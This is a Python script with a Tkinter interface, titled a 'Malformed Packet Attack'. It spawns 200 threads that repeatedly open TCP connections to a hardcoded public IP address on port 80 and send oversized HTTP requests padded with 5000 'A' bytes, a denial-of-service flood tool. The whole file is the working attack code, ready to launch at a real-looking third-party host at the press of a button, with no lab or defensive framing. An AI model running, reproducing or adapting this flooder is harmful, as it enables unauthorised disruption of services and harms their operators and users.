# malformed_packet_attack.py
import socket
import threading
import tkinter as tk
import time

TARGET_IP = "157.240.13.35"
PORT = 80
NUM_THREADS = 200
REQUESTS_PER_THREAD = 1000
stop_event = threading.Event()

def malformed_thread(output, thread_id):
    packet_count = 0
    try:
        while packet_count < REQUESTS_PER_THREAD and not stop_event.is_set():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, PORT))
            payload = b"GET /" + (b"A" * 5000) + b" HTTP/1.1\r\nHost: test.com\r\n\r\n"  # Oversized
            sock.send(payload)
            sock.close()
            packet_count += 1
            if packet_count % 100 == 0:
                output.insert(tk.END, f"[*] Thread {thread_id}: Sent {packet_count} packets\n")
                output.see(tk.END)
    except Exception as e:
        output.insert(tk.END, f"[!] Thread {thread_id} Failed: {e}\n")
    finally:
        output.insert(tk.END, f"[*] Thread {thread_id} Done: {packet_count} packets\n")

def run_attack(output):
    output.delete(1.0, tk.END)
    output.insert(tk.END, f"[*] Starting Malformed Packet Attack on {TARGET_IP}:{PORT}...\n")
    threads = []
    stop_event.clear()
    start_time = time.time()
    for i in range(NUM_THREADS):
        t = threading.Thread(target=malformed_thread, args=(output, i))
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(10)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    duration = time.time() - start_time
    output.insert(tk.END, f"[*] Completed in {duration:.2f}s\n")

root = tk.Tk()
root.title("Malformed Packet Attack")
root.geometry("600x400")
scrollbar = tk.Scrollbar(root)
output = tk.Text(root, height=20, width=70, yscrollcommand=scrollbar.set)
scrollbar.config(command=output.yview)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
output.pack(pady=10)
tk.Button(root, text="Run Attack", command=lambda: threading.Thread(target=run_attack, args=(output,), daemon=True).start()).pack(pady=5)
tk.Button(root, text="Exit", command=root.quit).pack(pady=5)
root.mainloop()